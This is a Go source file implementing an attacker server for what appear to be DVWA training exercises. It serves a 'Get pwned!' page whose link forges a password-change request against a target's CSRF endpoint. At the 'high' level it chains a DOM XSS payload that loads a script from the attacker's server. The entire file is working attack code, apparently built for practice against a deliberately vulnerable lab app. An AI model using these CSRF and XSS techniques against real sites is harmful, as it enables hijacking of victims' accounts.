package csrf

import (
	"fmt"
	"html/template"
	"net/http"
)

const html = `
<html>
	<h1>You are about to get attacked by CSRF.</h1>
	<a href="{{ . }}">Get pwned!</a>
</html>`

var tmpl = template.Must(template.New("csrf").Parse(html))

func Run(addr, security string, port int) error {
	attacker := NewCSRFAttacker(addr, security, port)
	return attacker.StartServer(port)
}

type CSRFAttacker struct {
	security string
	addr     string
}

func NewCSRFAttacker(addr, security string, port int) *CSRFAttacker {
	return &CSRFAttacker{
		security: security,
		addr:     addr,
	}
}

func (a *CSRFAttacker) StartServer(port int) error {
	switch a.security {
	case "low":
		href := fmt.Sprintf("http://%s/vulnerabilities/csrf/?password_new=low&password_conf=low&Change=Change", a.addr)

		http.HandleFunc("/csrf", func(w http.ResponseWriter, r *http.Request) {
			tmpl.Execute(w, href)
		})
	case "medium":
		href := fmt.Sprintf("http://%s/vulnerabilities/csrf/?password_new=medium&password_conf=medium&Change=Change", a.addr)

		http.HandleFunc("/csrf/localhost", func(w http.ResponseWriter, r *http.Request) {
			tmpl.Execute(w, href)
		})
	case "high":
		href := fmt.Sprintf(`http://%s/vulnerabilities/xss_d/?default=English#<script src="http://localhost:%d/static/csrf.js"></script>`, a.addr, port)

		http.HandleFunc("/csrf", func(w http.ResponseWriter, r *http.Request) {
			tmpl.Execute(w, href)
		})

		http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("csrf/static"))))
	}

	return http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
}
